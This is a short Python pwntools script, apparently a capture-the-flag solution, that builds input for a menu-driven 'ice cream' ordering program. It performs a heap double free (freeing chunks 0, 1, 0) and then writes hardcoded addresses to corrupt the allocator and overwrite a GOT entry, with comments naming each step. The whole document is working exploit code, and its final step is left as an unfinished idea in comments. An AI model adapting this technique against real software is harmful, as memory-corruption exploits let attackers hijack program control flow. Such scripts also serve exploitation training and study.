from pwn import *

e = ''

def init_name(name):
    global e
    e += pad(255, name) + "\n"

def order(size, text):
    global e
    """
    if size > 88:
        raise Exception("Size {} too big".format(size))
    """
    e += '0'*14 + "1\n{:015}\n{}\n".format(size, pad(size-1, text))

def free(index):
    global e
    e += '0'*14 + "2\n{:015}\n".format(index)

def rename(name):
    global e
    e += '0'*14 + "3\n{:255}\n".format(pad(255, name))

def pad(size, text):
    return text + '\x00'*(size-len(text))

def run():
    global e 
    print(e)

init_name("N"*255)

# Exploit
order(24, 'A'*23)
order(24, 'B'*23)

# Cause double free
free(0)
free(1)
free(0)

# Set pointer
order(24, p64(0x603020))
order(24, p64(0x603000))

# Overwrite GOT entry
# Idea: Point this to the name buffer, and make a valid block there
# This will let you overwrite part of the ice cream array
order(24, p64(0x603000))

# Cause a crash
# order(90, "hi")

run()
